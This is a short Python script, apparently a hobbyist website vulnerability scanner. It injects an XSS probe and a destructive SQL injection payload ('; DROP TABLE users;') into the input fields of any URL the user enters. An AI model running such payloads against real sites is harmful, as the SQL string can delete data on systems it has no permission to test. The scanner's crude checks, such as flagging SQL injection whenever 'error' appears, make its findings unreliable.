import requests
from bs4 import BeautifulSoup
from tqdm import tqdm

print("Welcome to Website Vulnerability Scanner")
print('\n')
# Define the target URL "http://testphp.vulnweb.com/
# https://manytools.org/hacker-tools/ascii-banner/
target_url = input("Enter your URL: ")

# Send a GET request to the target URL and receive the response
response = requests.get(target_url)

# Parse the HTML code of the response
soup = BeautifulSoup(response.text, "html.parser")

# Find all input fields in the HTML code
input_fields = soup.find_all("input")

# Define a dictionary to store the vulnerabilities detected
vulnerabilities = {}

# Check for XSS vulnerabilities by injecting malicious JavaScript code
progress_bar = tqdm(input_fields, unit='field', ncols=80, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}')
for input_field in progress_bar:
    payload = "<script>alert('XSS');</script>"
    input_field["value"] = payload
    # Resend the modified request and check if the code is executed
    modified_response = requests.get(target_url, params={input_field["name"]: input_field["value"]})
    if payload in modified_response.text:
        vulnerabilities.setdefault("XSS", []).append(f"Input field '{input_field['name']}' is vulnerable to XSS")

# Check for SQL injection vulnerabilities by injecting SQL commands
for input_field in tqdm(input_fields, unit='field', ncols=80, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}'):
    payload = "'; DROP TABLE users;"
    input_field["value"] = payload
    # Resend the modified request and check if the command is executed
    modified_response = requests.get(target_url, params={input_field["name"]: input_field["value"]})
    if "error" in modified_response.text:
        vulnerabilities.setdefault("SQL injection", []).append(f"Input field '{input_field['name']}' is vulnerable to SQL injection")

# Close the progress bar
progress_bar.close()

# Print the vulnerabilities detected
if vulnerabilities:
    print(f"\nVulnerabilities detected in {target_url}:")
    for vulnerability_type, vulnerability_details in vulnerabilities.items():
        print(f"{vulnerability_type}:")
        for vulnerability_detail in vulnerability_details:
            print(f"- {vulnerability_detail}")
else:
    print(f"No vulnerabilities detected in {target_url}")
